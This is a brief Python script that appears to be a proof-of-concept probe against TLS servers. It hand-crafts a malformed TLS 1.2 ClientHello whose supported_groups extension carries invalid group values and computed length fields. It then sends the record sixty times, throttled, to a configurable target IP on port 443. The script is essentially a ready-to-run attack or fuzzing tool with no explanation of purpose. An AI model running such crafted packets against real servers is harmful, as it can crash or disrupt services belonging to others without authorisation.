
import sys
import base64
import socket
import random
import os
import time
#####CHANGE THIS:
ip="172.29.224.248"
throttle=0.5 #sending two per second for tls 1.2
#################
            
i = 0        
while i<60:
    try:


        
        supgroups=b"\x00\n\x00\x06\x00\x04\x00\x00"+b"\x00"*0x00+b"\x01\x04"
        exts=0x8+len(supgroups)
        stotals=0x2b+exts
        totals=stotals+0x4

        bytestls =  b"\x16\x03\x01"+totals.to_bytes(2,'big') 
        bytestls += b"\x01" #Handshake  type
        bytestls += stotals.to_bytes(3,'big')  #Length
        bytestls += b"\x03\x03" #Version
        bytestls += b"\x00\x00\x00\x00\x7a" #random
        bytestls += b"\xab\x56\x41\x81\x12\x30\x35\xc9\x7c\x21\x16\x30\xcf\x28\x41\x75" #random
        bytestls += b"\x05\xc6\x50\xd5\x0d\x1b\x7b\x6a\xc1\x50\x06"#random
        bytestls+=b"\x00"
        bytestls+=b"\x00\x02\xcc\xa8"
        bytestls+=b"\x01\x00"+exts.to_bytes(2,'big')+b"\x00\x0d\x00\x04\x00\x02\x08\x06"
        bytestls+=supgroups

   
        i+=1
    
        s     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,443))        
        s.send(bytestls)
        time.sleep(throttle)

        s.close()
    except(KeyboardInterrupt,SystemExit):
        print('blah')
        raise
    except Exception as e:
        print(e)
        pass
    